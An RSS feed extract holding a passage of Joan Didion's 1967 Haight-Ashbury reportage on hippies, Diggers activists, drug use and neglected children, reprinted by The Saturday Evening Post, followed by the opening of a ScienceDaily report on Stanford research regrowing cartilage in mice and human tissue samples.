    &lt;p&gt;Deadeye‚Äôs old lady, Gerry, meets us at the door of their place. She is a big, hearty girl who has always counseled at Girl Scout camps during summer vacations and was ‚Äúin social welfare‚Äù at the University of Washington when she decided that she ‚Äújust hadn‚Äôt done enough living‚Äù and came to San Francisco. ‚ÄúActually, the heat was bad in Seattle,‚Äù she adds.&lt;/p&gt;
    &lt;p&gt;‚ÄúThe first night I got down here,‚Äù she says, ‚ÄúI stayed with a gal I met over at the Blue Unicorn. I looked like I‚Äôd just arrived, had a knapsack and stuff.‚Äù After that Gerry stayed at a house the Diggers were running, where she met Deadeye. ‚ÄúThen it took time to get my bearings, so I haven‚Äôt done much work yet.‚Äù&lt;/p&gt;
    &lt;p&gt;I ask Gerry what work she does. ‚ÄúBasically I‚Äôm a poet, but I had my guitar stolen right after I arrived, and that kind of hung up my thing.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúGet your books,‚Äù Deadeye orders. ‚ÄúShow her your books.‚Äù&lt;/p&gt;
    &lt;p&gt;Gerry demurs, then goes into the bedroom and comes back with several theme books full of verse. I leaf through them but Deadeye is still talking about helping people. ‚ÄúAny kid that‚Äôs on speed,‚Äù he says, ‚ÄúI‚Äôll try to get him off it. The only advantage to it from the kids‚Äô point of view is that you don‚Äôt have to worry about sleeping or eating.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúOr sex,‚Äù Gerry adds.&lt;/p&gt;
    &lt;p&gt;‚ÄúThat‚Äôs right. When you‚Äôre strung out on crystal you don‚Äôt need nothing.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúIt can lead to the hard stuff,‚Äù Gerry says. ‚ÄúTake your average Meth freak, once he‚Äôs started putting the needle in his arm, it‚Äôs not too hard to say, well, let‚Äôs shoot a little smack.‚Äù&lt;/p&gt;
    &lt;p&gt;All the while I am looking at Gerry‚Äôs poems. They are a very young girl‚Äôs poems, each written out in a neat hand and finished off with a curlicue. Dawns are roseate, skies silver-tinted. When she writes ‚Äúcrystal‚Äù in her books, she does not mean Meth.&lt;/p&gt;
    &lt;p&gt;‚ÄúYou gotta get back to your writing,‚Äù Deadeye says fondly, but Gerry ignores this. She is telling about somebody who propositioned her yesterday. ‚ÄúHe just walked up to me on the Street, offered me $600 to go to Reno and do the thing.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúYou‚Äôre not the only one he approached,‚Äù Deadeye says.&lt;/p&gt;
    &lt;p&gt;‚ÄúIf some chick wants to go with him, fine,‚Äù Gerry says. ‚ÄúJust don‚Äôt bum my trip.‚Äù She empties the tuna-fish can we are using for an ashtray and goes over to look at a girl who is asleep on the floor. It is the same girl who was asleep on the floor the first day I came to Deadeye‚Äôs place. She has been sick a week now, 10 days. ‚ÄúUsually when somebody comes up to me on the Street like that,‚Äù Gerry adds, ‚ÄúI hit him for some change.‚Äù&lt;/p&gt;
    &lt;p&gt;When I saw Gerry in the Park the next day I asked her about the sick girl, and Gerry said cheerfully that she was in the hospital with pneumonia.&lt;/p&gt;
    &lt;p&gt;Max tells me about how he and Sharon got together. ‚ÄúWhen I saw her the first time on Haight Street, I flashed. I mean flashed. So I started some conversation with her about her beads, see, but I didn‚Äôt care about her beads.‚Äù Sharon lived in a house where a friend of Max‚Äôs lived, and the next time he saw her was when he took the friend some bananas. ‚ÄúSharon and I were like kids ‚Äî we smoked bananas and looked at each other and smoked more bananas and looked at each other.‚Äù&lt;/p&gt;
    &lt;p&gt;But Max hesitated. For one thing, he thought Sharon was his friend‚Äôs girl. ‚ÄúFor another I didn‚Äôt know if I wanted to get hung up with an old lady.‚Äù But the next time he visited the house, Sharon was on acid.&lt;/p&gt;
    &lt;p&gt;‚ÄúSo everybody yelled, ‚ÄòHere comes the banana man,‚Äô‚Äù Sharon interrupts, ‚Äúand I got all excited.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúShe was living in this crazy house,‚Äù Max continues. ‚ÄúThere was this one kid, all he did was scream. His whole trip was to practice screams. It was too much.‚Äù Max still hung back from Sharon. ‚ÄúBut then Sharon offered me a tab, and I knew.‚Äù&lt;/p&gt;
    &lt;p&gt;Max walked to the kitchen and back with the tab, wondering whether to take it. ‚ÄúAnd then I decided to flow with it, and that was that. Because once you drop acid with somebody, you flash on, you see the whole world melt in her eyes.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúIt‚Äôs stronger than anything in the world,‚Äù Sharon says.&lt;/p&gt;
    &lt;p&gt;‚ÄúNothing can break it up,‚Äù Max says. ‚ÄúAs long as it lasts.‚Äù&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;No milk today ‚Äî&lt;/p&gt;&lt;lb/&gt;My love has gone away . . .&lt;lb/&gt;The end of my hopes ‚Äî&lt;lb/&gt;The end of all my dreams ‚Äî&lt;/quote&gt;
    &lt;p&gt;is a song I heard on many mornings in 1967 on KFRC, the Flower Power Station, San Francisco.&lt;/p&gt;
    &lt;p&gt;Deadeye and Gerry tell me that they plan to be married. An Episcopal priest in the District has promised to perform the wedding in Golden Gate Park, and they will have a few rock groups there, ‚Äúa real community thing.‚Äù Gerry‚Äôs brother is also getting married, in Seattle. ‚ÄúKind of interesting,‚Äù Gerry muses, ‚Äúbecause, you know, his is the traditional straight wedding, and then you have the contrast with ours.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúI‚Äôll have to wear a tie to his,‚Äù Deadeye says.&lt;/p&gt;
    &lt;p&gt;‚ÄúRight,‚Äù Gerry says.&lt;/p&gt;
    &lt;p&gt;‚ÄúHer parents came down to meet me, but they weren‚Äôt ready for me,‚Äù Deadeye notes philosophically.&lt;/p&gt;
    &lt;p&gt;‚ÄúThey finally gave it their blessing,‚Äù Gerry says. ‚ÄúIn a way.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúThey came to me and her father said, ‚ÄòTake care of her,‚Äô ‚ÄúDeadeye reminisces. ‚ÄúAnd her mother said, ‚ÄòDon‚Äôt let her go to jail.‚Äô‚Äù&lt;/p&gt;
    &lt;p&gt;Barbara has baked a macrobiotic apple pie ‚Äî one made without sweets and with whole-wheat flour ‚Äî and she and Tom and Max and Sharon and I are eating it. Barbara tells me how she learned to find happiness in ‚Äúthe woman‚Äôs thing.‚Äù She and Tom had gone somewhere to live with the Indians, and although she first found it hard to be shunted off with the women and never to enter into any of the men‚Äôs talk, she soon got the point. ‚ÄúThat was where the trip was,‚Äù she says.&lt;/p&gt;
    &lt;p&gt;Barbara is on what is called the woman‚Äôs trip to the exclusion of almost everything else. When she and Tom and Max and Sharon need money, Barbara will take a part-time job, modeling or teaching kindergarten, but she dislikes earning more than $10 or $20 a week. Most of the time she keeps house and bakes. ‚ÄúDoing something that shows your love that way,‚Äù she says, ‚Äúis just about the most beautiful thing I know.‚Äù Whenever I hear about the woman‚Äôs trip, which is often, I think a lot about nothin‚Äô-says-lovin‚Äô-like-something-from-the-oven and the Feminine Mystique and how it is possible for people to be the unconscious instruments of values they would strenuously reject on a conscious level, but I do not mention this to Barbara.&lt;/p&gt;
    &lt;p&gt;It is a pretty nice day and I am just driving down the Street and I see Barbara at a light.&lt;/p&gt;
    &lt;p&gt;What am I doing, she wants to know.&lt;/p&gt;
    &lt;p&gt;I am just driving around.&lt;/p&gt;
    &lt;p&gt;‚ÄúGroovy,‚Äù she says.&lt;/p&gt;
    &lt;p&gt;This is quite a beautiful day, I say.&lt;/p&gt;
    &lt;p&gt;‚ÄúGroovy,‚Äù she agrees.&lt;/p&gt;
    &lt;p&gt;She wants to know if I will come over. Sometime soon, I say.&lt;/p&gt;
    &lt;p&gt;‚ÄúGroovy,‚Äù she says.&lt;/p&gt;
    &lt;p&gt;I ask if she wants to drive in the Park but she is too busy. She is out to buy wool for her loom.&lt;/p&gt;
    &lt;p&gt;Arthur Lisch gets pretty nervous whenever he sees me now because the Digger line this week is that they aren‚Äôt talking to ‚Äúmedia poisoners,‚Äù which is me. So I still don‚Äôt have a tap on Chester Anderson, but one day in the Panhandle I run into a kid who says he is Chester‚Äôs ‚Äúassociate.‚Äù He has on a black cape, black slouch hat, mauve Job‚Äôs Daughters‚Äô sweatshirt and dark glasses, and he says his name is Claude Hayward, but never mind that because I think of him just as The Connection. The Connection offers to ‚Äúcheck me out.‚Äù&lt;/p&gt;
    &lt;p&gt;I take off my dark glasses so he can see my eyes. He leaves his on.&lt;/p&gt;
    &lt;p&gt;‚ÄúHow much you get paid for doing this kind of media poisoning?‚Äù he says for openers.&lt;/p&gt;
    &lt;p&gt;I put my dark glasses back on.&lt;/p&gt;
    &lt;p&gt;‚ÄúThere‚Äôs only one way to find out where it‚Äôs at,‚Äù The Connection says, and jerks his thumb at the photographer I‚Äôm with. ‚ÄúDump him and get out on the Street. Don‚Äôt take money. You won‚Äôt need money.‚Äù He reaches into his cape and pulls out a mimeographed sheet announcing a series of classes at the Digger Free Store on How to Avoid Getting Busted, VD, Rape, Pregnancy, Beatings and Starvation. ‚ÄúYou oughta come,‚Äù The Connection says. ‚ÄúYou‚Äôll need it.‚Äù&lt;/p&gt;
    &lt;p&gt;I say maybe, but meanwhile I would like to talk to Chester Anderson.&lt;/p&gt;
    &lt;p&gt;‚ÄúIf we decide to get in touch with you at all,‚Äù The Connection says, ‚Äúwe‚Äôll get in touch with you real quick.‚Äù He kept an eye on me in the Park after that, but he never did call the number I gave him.&lt;/p&gt;
    &lt;p&gt;It is twilight and cold and too early to find Deadeye at the Blue Unicorn so I ring Max‚Äôs bell. Barbara comes to the door.&lt;/p&gt;
    &lt;p&gt;‚ÄúMax and Tom are seeing somebody on a kind of business thing,‚Äù she says. ‚ÄúCan you come back a little later?‚Äù I am hard put to think what Max and Tom might be seeing somebody about in the way of business, but a few days later in the Park I find out.&lt;/p&gt;
    &lt;p&gt;‚ÄúHey,‚Äù Tom calls. ‚ÄúSorry you couldn‚Äôt come up the other day, but business was being done.‚Äù This time I get the point. ‚ÄúWe got some great stuff,‚Äù he adds, and begins to elaborate. Every third person in the Park this afternoon looks like a narcotics agent and I try to change the subject. Later I suggest to Max that he be more wary in public. ‚ÄúListen, I‚Äôm very cautious,‚Äù he says. ‚ÄúYou can‚Äôt be too careful.‚Äù&lt;/p&gt;
    &lt;p&gt;By now I have an unofficial taboo contact with the San Francisco Police Department. What happens is that this cop and I meet in various late-movie ways, like I happen to be sitting in the bleachers at a baseball game and he happens to sit down next to me, and we exchange guarded generalities. No information actually passes between us, but after a while we get to kind of like each other.&lt;/p&gt;
    &lt;p&gt;‚ÄúThe kids aren‚Äôt too bright,‚Äù he is telling me on this particular day. ‚ÄúThey‚Äôll tell you they can always spot an undercover, they‚Äôll tell you about ‚Äòthe kind of car he drives.‚Äô They aren‚Äôt talking about undercovers, they‚Äôre talking about plainclothesmen who just happen to drive unmarked cars, like I do. They can‚Äôt tell an undercover. An undercover doesn‚Äôt drive some black Ford with a two-way radio.‚Äù&lt;/p&gt;
    &lt;p&gt;He tells me about an undercover who was taken out of the District because he was believed to be over-exposed, too familiar. He was transferred to the narcotics squad, and by error was immediately sent back into the District as a narcotics undercover.&lt;/p&gt;
    &lt;p&gt;The cop plays with his keys. ‚ÄúYou want to know how smart these kids are?‚Äù he says finally. ‚ÄúThe first week, this guy makes 43 cases.‚Äù&lt;/p&gt;
    &lt;p&gt;Some kid with braces on his teeth is playing his guitar and boasting that he got the last of the STP from Mr. X himself, and someone else is talking about some acid that will be available within the next month, and you can see that nothing much is happening around the San Francisco Oracle office this afternoon. A boy sits at a drawing board drawing the infinitesimal figures that people do on speed, and the kid with the braces watches him. ‚ÄúI‚Äôm gonna shoot my wo‚Äìman,‚Äù he sings softly. ‚ÄúShe been with a‚Äìnoth‚Äìer man.‚Äù Someone works out the numerology of my name and the name of the photographer I‚Äôm with. The photographer‚Äôs is all white and the sea (‚ÄúIf I were to make you some beads, see, I‚Äôd do it mainly in white,‚Äù he is told), but mine has a double death symbol. The afternoon does not seem to be getting anywhere, so it‚Äôs suggested we get in touch with a man named Sandy. We are told he will take us to the Zen temple.&lt;/p&gt;
    &lt;p&gt;Four boys and one middle-aged man are sitting on a grass mat at Sandy‚Äôs place, sipping anise tea and listening to Sandy read Laura Huxley‚Äôs You Are Not the Target.&lt;/p&gt;
    &lt;p&gt;We sit down and have some anise tea. ‚ÄúMeditation turns us on,‚Äù Sandy says. He has a shaved head and the kind of cherubic face usually seen in newspaper photographs of mass murderers. The middle-aged man, whose name is George, is making me uneasy because he is in a trance next to me and he stares at me without seeing me.&lt;/p&gt;
    &lt;p&gt;I feel that my mind is going ‚Äî George is dead, or we all are ‚Äî when the telephone suddenly rings.&lt;/p&gt;
    &lt;p&gt;‚ÄúIt‚Äôs for George,‚Äù Sandy says.&lt;/p&gt;
    &lt;p&gt;‚ÄúGeorge, telephone.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúGeorge.‚Äù&lt;/p&gt;
    &lt;p&gt;Somebody waves his hand in front of George and George finally gets up, bows, and moves toward the door on the balls of his feet.&lt;/p&gt;
    &lt;p&gt;‚ÄúI think I‚Äôll take George‚Äôs tea,‚Äù somebody says. ‚ÄúGeorge ‚Äî are you coming back?‚Äù&lt;/p&gt;
    &lt;p&gt;George stops at the door and stares at each of us in turn. ‚ÄúIn a moment,‚Äù he snaps.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Do you know who is the first eternal spaceman of this universe?&lt;/p&gt;&lt;lb/&gt;The first to send his wild wild vibrations&lt;lb/&gt;To all those cosmic superstations?&lt;lb/&gt;For the song he always shouts&lt;lb/&gt;Sends the planets flipping out . . .&lt;lb/&gt;But I‚Äôll tell you before you think me loony&lt;lb/&gt;That I‚Äôm talking about Narada Muni . . .&lt;lb/&gt;Singing&lt;lb/&gt;HARE KRISHNA HARE KRISHNA&lt;lb/&gt;KRISHNA KRISHNA HARE HARE&lt;lb/&gt;HARE RAMA HARE RAMA&lt;lb/&gt;RAMA RAMA HARE HARE&lt;/quote&gt;
    &lt;p&gt;is a Krishna song. Words by Howard Wheeler and music by Michael Grant.&lt;/p&gt;
    &lt;p&gt;Maybe the trip is not in Zen but in Krishna, so I visit Michael Grant, the Swami A. C. Bhaktivedanta‚Äôs leading disciple in San Francisco. Grant is at home with his brother-in-law and his wife, a pretty girl wearing a cashmere pullover, a jumper and a red caste mark on her forehead.&lt;/p&gt;
    &lt;p&gt;‚ÄúI‚Äôve been associated with the Swami since about last July,‚Äù Michael says. ‚ÄúSee, the Swami came here from India, and he was at this ashram (hermitage) in upstate New York and he just kept to himself and chanted a lot. For a couple of months, pretty soon I helped him get his storefront in New York. Now it‚Äôs an international movement, which we spread by teaching this chant.‚Äù Michael is fingering his red wooden beads, and I notice that I am the only person in the room who is wearing shoes. ‚ÄúIt‚Äôs catching on like wildfire.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúIf everybody chanted,‚Äù the brother-in-law says, ‚Äúthere wouldn‚Äôt be any problem with the police or anybody.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúGinsberg calls the chant ecstasy, but the Swami says that‚Äôs not exactly it.‚Äù Michael walks across the room and straightens a picture of Krishna as a baby. ‚ÄúToo bad you can‚Äôt meet the Swami,‚Äù he adds. ‚ÄúThe Swami‚Äôs in New York now.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúEcstasy‚Äôs not the right word at all,‚Äù says the brother-in-law, who has been thinking about it. ‚ÄúIt makes you think of some mundane ecstasy.‚Äù&lt;/p&gt;
    &lt;p&gt;The next day I drop by Max and Sharon‚Äôs, and find them in bed smoking a little morning hash. Sharon once advised me that even half a joint of grass would make getting up in the morning a beautiful thing. I ask Max how Krishna strikes him.&lt;/p&gt;
    &lt;p&gt;‚ÄúYou can get a high on a mantra,‚Äù he says. ‚ÄúBut I‚Äôm holy on acid.‚Äù&lt;/p&gt;
    &lt;p&gt;Max passes the joint to Sharon and leans back. ‚ÄúToo bad you couldn‚Äôt meet the Swami,‚Äù he says. ‚ÄúThe Swami was the turn-on.‚Äù&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;‚ÄúAnybody who thinks this is all about drugs has his head in a bag. It‚Äôs a social movement, quintessentially romantic, the kind that recurs in times of real social crisis. The themes are always the same. A return to innocence. The invocation of an earlier authority and control. The mysteries of the blood. An itch for the transcendental, for purification. Right there you‚Äôve got the ways that romanticism historically ends up in trouble, lends itself to authoritarianism. When the direction appears. How long do you think it‚Äôll take for that to happen?‚Äù&lt;/p&gt;
      &lt;p&gt;is a question a San Francisco psychiatrist asked me.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;At the time, I was in San Francisco, the political potential of the movement was just becoming clear. It had always been clear to the revolutionary core of the Diggers, whose guerrilla talent was now bent on open confrontations and the creation of a summer emergency, and it was clear to many of the doctors and priests and sociologists who had occasion to work in the District, and it could rapidly become clear to any outsider who bothered to decode Chester Anderson‚Äôs call-to-action communiqu√©s or to watch who was there first at the street skirmishes which now set the tone for life in the District. One did not have to be a political analyst to see it: The boys in the rock groups saw it, because they were often where it was happening. ‚ÄúIn the Park there are always twenty or thirty people below the stand,‚Äù one of the Grateful Dead complained to me, ‚Äúready to take the crowd on some militant trip.‚Äù&lt;/p&gt;
    &lt;p&gt;But the peculiar beauty of this political potential, as far as the activists were concerned, was that it remained not clear at all to most of the inhabitants of the District. Nor was it clear to the press, which at varying levels of competence continued to report ‚Äúthe hippie phenomenon‚Äù as an extended panty raid; an artistic avant-garde led by such comfortable YMHA regulars as Allen Ginsberg; or a thoughtful protest, not unlike joining the Peace Corps.&lt;/p&gt;
    &lt;p&gt;This last, or they‚Äôre-trying-to-tell-us-something approach, reached its apogee in July in a Time cover story which revealed that hippies ‚Äúscorn money ‚Äî they call it ‚Äòbread,‚Äô‚Äù and remains the most remarkable, if unwitting, extant evidence that the signals between the generations are irrevocably jammed.&lt;/p&gt;
    &lt;p&gt;Because the signals the press was getting were immaculate of political possibilities, the tensions of the District went unremarked upon, even during the period when there were so many observers on Haight Street from Life and Look and CBS that they were largely observing one another. The observers believed roughly what the children told them: That they were a generation dropped out of political action, beyond power games, that the New Left was on an ego trip. Ergo, there really were no activists in the Haight-Ashbury, and those things which happened every Sunday were spontaneous demonstrations because, just as the Diggers say, the police are brutal and juveniles have no rights and runaways are deprived of their right to self-determination, and people are starving to death on Haight Street.&lt;/p&gt;
    &lt;p&gt;Of course the activists ‚Äî not those whose thinking had become rigid, but those whose approach to revolution was imaginatively anarchic ‚Äî had long ago grasped the reality which still eluded the press: We were seeing something important. We were seeing the desperate attempt of a handful of pathetically unequipped children to create a community in a social vacuum. Once we had seen these children, we could no longer overlook the vacuum, no longer pretend that the society‚Äôs atomization could be reversed. At some point between 1945 and 1967, we had somehow neglected to tell these children the rules of the game we happened to be playing. Maybe we had stopped believing in the rules ourselves, maybe we were having a failure of nerve about the game. Or maybe there were just too few people around to do the telling. These were children who grew up cut loose from the web of cousins and great-aunts and family doctors and lifelong neighbors who had traditionally suggested and enforced the society‚Äôs values. They are children who have moved around a lot, San Jose, Chula Vista, here. They are less in rebellion against the society than ignorant of it, able only to feed back certain of its most publicized self-doubts, Vietnam, diet pills, the Bomb.&lt;/p&gt;
    &lt;p&gt;They feed back exactly what is given them. Because they do not believe in words ‚Äî words are for ‚Äútypeheads,‚Äù Chester Anderson tells them, and a thought which needs words is just another ego trip ‚Äî their only proficient vocabulary is in the society‚Äôs platitudes. As it happens, I am still committed to the idea that the ability to think for oneself depends upon one‚Äôs mastery of the language, and I am not optimistic about children who will settle for saying, to indicate that their mother and father do not live together, that they come from ‚Äúa broken home.‚Äù They are 14, 15, 16 years old, younger all the time, an army of children waiting to be given the words.&lt;/p&gt;
    &lt;p&gt;Peter Berg knows a lot of words.&lt;/p&gt;
    &lt;p&gt;‚ÄúIs Peter Berg around?‚Äù I ask.&lt;/p&gt;
    &lt;p&gt;‚ÄúMaybe.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúAre you Peter Berg?‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúYeh.‚Äù&lt;/p&gt;
    &lt;p&gt;The reason Peter Berg does not bother to share too many words with me is because two of the words he knows are ‚Äúmedia poisoning.‚Äù Peter Berg wears a gold earring and is perhaps the only person in the District upon whom a gold earring looks obscurely ominous. He belongs to the San Francisco Mime Troupe, some of whose members started the Artist‚Äôs Liberation Front for ‚Äúthose who seek to combine their creative urge with socio-political involvement.‚Äù It was out of the Mime Troupe that the Diggers grew, during the 1966 Hunter‚Äôs Point riots when it seemed a good idea to give away food and do puppet shows in the streets, making fun of the National Guard. Along with Arthur Lisch, Peter Berg is part of the shadow leadership of the Diggers, and it was he who more or less invented and first introduced to the press the notion that there would be an influx into San Francisco this summer of 200,000 indigent adolescents. The only conversation I ever have with Peter Berg is about how he holds me personally responsible for the way Life captioned Henri Cartier-Bresson‚Äôs pictures out of Cuba, but I like to watch him at work in the Park.&lt;/p&gt;
    &lt;p&gt;Big Brother is playing in the Panhandle, and almost everybody is high, and it is a pretty nice Sunday afternoon between three and six o‚Äôclock, which the activists say are the three hours of the week when something is most likely to happen in the Haight-Ashbury, and who turns up but Peter Berg. He is with his wife and six or seven other people, along with Chester Anderson‚Äôs associate The Connection, and the first peculiar thing is, they‚Äôre in blackface. I mention to Max and Sharon that some members of the Mime Troupe seem to be in blackface.&lt;/p&gt;
    &lt;p&gt;‚ÄúIt‚Äôs street theater,‚Äù Sharon assures me. ‚ÄúIt‚Äôs supposed to be really groovy.‚Äù&lt;/p&gt;
    &lt;p&gt;The Mime Troupers get a little closer, and there are some other peculiar things about them. For one thing they are tapping people on the head with dimestore plastic nightsticks, and for another they are wearing signs on their backs: HOW MANY TIMES YOU BEEN RAPED, YOU LOVE FREAKS? and things like that. Then they are distributing communication-company fliers which say:&lt;/p&gt;
    &lt;quote&gt;
      &lt;code&gt;&amp;amp; this summer thousands of unwhite un‚Äìsuburban boppers are going to want to know why you‚Äôve given up what they can‚Äôt get &amp;amp; how you get away with it &amp;amp; how come you not a faggot with hair so long &amp;amp; they want haight street one way or the other. IF YOU DON‚ÄôT KNOW, BY AUGUST HAIGHT STREET WILL BE A CEMETERY.&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;Max reads the flier and stands up. ‚ÄúI‚Äôm getting bad vibes,‚Äù he says, and he and Sharon leave.&lt;/p&gt;
    &lt;p&gt;I have to stay around because I‚Äôm looking for Otto so I walk over to where the Mime Troupers have formed a circle around a Negro. Peter Berg is saying, if anybody asks, that this is street theater, and I figure the curtain is up because what they are doing right now is jabbing the Negro with the nightsticks. They jab, and they bare their teeth, and they rock on the balls of their feet, and they wait.&lt;/p&gt;
    &lt;p&gt;‚ÄúI‚Äôm beginning to get annoyed here,‚Äù the Negro says. ‚ÄúI‚Äôm gonna get mad.‚Äù By now there are several Negroes around, reading the signs and watching.&lt;/p&gt;
    &lt;p&gt;‚ÄúJust beginning to get annoyed, are you?‚Äù one of the Mime Troupers says. ‚ÄúDon‚Äôt you think it‚Äôs about time?‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúListen, here,‚Äù another Negro says. ‚ÄúThere‚Äôs room for everybody in the Park.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúYeah?‚Äù a girl in blackface says. ‚ÄúEverybody who?‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúWhy,‚Äù he says, confused. ‚ÄúEverybody. In America.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúIn America,‚Äùthe blackface girl shrieks. ‚ÄúListen to him talk about America.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúListen,‚Äù he says. ‚ÄúListen here.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúWhat‚Äôd America ever do for you?‚Äù the girl in blackface jeers. ‚ÄúWhite kids here, they can sit in the Park all summer long, listening to music, because their big-shot parents keep sending them money. Who ever sends you money?‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúListen,‚Äù the Negro says helplessly. ‚ÄúYou‚Äôre gonna start something here, this isn‚Äôt right ‚Äî‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúYou tell us what‚Äôs right, black boy,‚Äù the girl says.&lt;/p&gt;
    &lt;p&gt;The youngest member of the blackface group, an earnest tall kid about 19, 20, is hanging back at the edge of the scene. I offer him an apple and ask what is going on. ‚ÄúWell,‚Äù he says, ‚ÄúI‚Äôm new at this, I‚Äôm just beginning to study it, but you see the capitalists are taking over the District, and that‚Äôs what Peter ‚Äî well, ask Peter.‚Äù&lt;/p&gt;
    &lt;p&gt;I did not ask Peter. It went on for a while. But on that particular Sunday between three and six o‚Äôclock everyone was too high, and the weather was too good, and the Hunter‚Äôs Point gangs who usually come in between three and six on Sunday afternoon had come in on Saturday instead, and nothing started. While I waited for Otto I asked a little girl I had met a couple of times before what she had thought of it. ‚ÄúIt‚Äôs something groovy they call street theater,‚Äù she said. I said I had wondered if it might not have political overtones. She is 17 years old, and she worked it around in her mind for a while and finally she remembered a couple of words from somewhere. ‚ÄúMaybe it‚Äôs some John Birch thing,‚Äù she said.&lt;/p&gt;
    &lt;p&gt;When I finally find Otto he says, ‚ÄúI got something at my place that‚Äôll blow your mind,‚Äù and when we get there I see a child on the living-room floor, wearing a reefer coat, reading a comic book. She keeps licking her lips in concentration and the only off thing about her is that she‚Äôs wearing white lipstick.&lt;/p&gt;
    &lt;p&gt;‚ÄúFive years old,‚Äù he says. ‚ÄúOn acid.‚Äù&lt;/p&gt;
    &lt;p&gt;The five-year-old‚Äôs name is Susan, and she tells me she is in High Kindergarten. She lives with her mother and some other people, just got over the measles, wants a bicycle for Christmas, and particularly likes soda, ice cream, Marty in the Jefferson Airplane, Bob in the Grateful Dead, and the beach. She remembers going to the beach once a long time ago, and wishes she had taken a bucket. For a year, her mother has given her acid and peyote. Susan describes it as getting stoned.&lt;/p&gt;
    &lt;p&gt;I start to ask if any of the other children in High Kindergarten get stoned, but I falter at the key words.&lt;/p&gt;
    &lt;p&gt;‚ÄúShe means do the other kids in your class turn on, get stoned,‚Äù says the friend of her mothers who brought her to Otto‚Äôs.&lt;/p&gt;
    &lt;p&gt;‚ÄúOnly Sally and Anne,‚Äù Susan says.&lt;/p&gt;
    &lt;p&gt;‚ÄúWhat about Lia?‚Äù her mother‚Äôs friend prompts.&lt;/p&gt;
    &lt;p&gt;‚ÄúLia,‚Äù Susan says, ‚Äúis not in High Kindergarten.‚Äù&lt;/p&gt;
    &lt;p&gt;Sue Ann‚Äôs three-year-old Michael started a fire this morning before anyone was up, but Don got it out before much damage was done. Michael burned his arm, though, which is probably why his mother was so jumpy when she happened to see him chewing on an electric cord. ‚ÄúYou‚Äôll fry like rice,‚Äù she screamed. The only people around were Don and one of Sue Ann‚Äôs macrobiotic friends and somebody who was on his way to a commune in the Santa Lucias, and they didn‚Äôt notice Sue Ann screaming at Michael because they were in the kitchen trying to retrieve some very good Moroccan hash which had dropped down through a floorboard that had been damaged in the fire.&lt;/p&gt;
    &lt;p&gt;This article is featured in the July/August 2017 issue of The Saturday Evening Post. Subscribe to the magazine for more art, inspiring stories, fiction, humor, and features from our archives.&lt;/p&gt;
    &lt;p&gt;Yeats Poem ¬© 1924 The Macmillan Company. Renewed 1952 Bertha Georgie Yeats.&lt;lb/&gt; ‚ÄúKrishna Song‚Äù ¬© 1967 by International Society for Krishna Consciousness&lt;lb/&gt; ‚ÄúNo Milk Today‚Äù ¬© 1966-1967 Man-Ken Music Ltd.&lt;/p&gt;
    &lt;p&gt;Become a Saturday Evening Post member and enjoy unlimited access. Subscribe now&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46708766</guid><pubDate>Wed, 21 Jan 2026 17:36:09 +0000</pubDate></item><item><title>Scientists find a way to regrow cartilage in mice and human tissue samples</title><link>https://www.sciencedaily.com/releases/2026/01/260120000333.htm</link><description>&lt;doc fingerprint="fc881a2139a70b82"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Stanford scientists found a way to regrow cartilage and stop arthritis&lt;/head&gt;
    &lt;head rend="h2"&gt;Scientists have found a way to regrow aging cartilage, raising hopes for arthritis treatments that could make joint replacements obsolete.&lt;/head&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Date:&lt;/item&gt;
      &lt;item rend="dd-1"&gt;January 20, 2026&lt;/item&gt;
      &lt;item rend="dt-2"&gt;Source:&lt;/item&gt;
      &lt;item rend="dd-2"&gt;Stanford Medicine&lt;/item&gt;
      &lt;item rend="dt-3"&gt;Summary:&lt;/item&gt;
      &lt;item rend="dd-3"&gt;Scientists at Stanford Medicine have discovered a treatment that can reverse cartilage loss in aging joints and even prevent arthritis after knee injuries. By blocking a protein linked to aging, the therapy restored healthy, shock-absorbing cartilage in old mice and injured joints, dramatically improving movement and joint function. Human cartilage samples from knee replacement surgeries also began regenerating when exposed to the treatment.&lt;/item&gt;
      &lt;item rend="dt-4"&gt;Share:&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;A study led by Stanford Medicine researchers has found that an injection blocking a protein linked to aging can reverse the natural loss of knee cartilage in older mice. The same treatment also stopped arthritis from developing after knee injuries that resemble ACL tears, which are common among athletes and recreational exercisers. Researchers note that an oral version of the treatment is already being tested in clinical trials aimed at treating age-related muscle weakness.&lt;/p&gt;
    &lt;p&gt;Human cartilage samples taken from knee replacement surgeries also responded positively. These samples included both the supportive extracellular matrix of the joint and cartilage-producing chondrocyte cells. When treated, the tissue began forming new, functional cartilage.&lt;/p&gt;
    &lt;p&gt;Together, the findings suggest that cartilage lost due to aging or arthritis may one day be restored using either a pill or a targeted injection. If successful in people, such treatments could reduce or even eliminate the need for knee and hip replacement surgery.&lt;/p&gt;
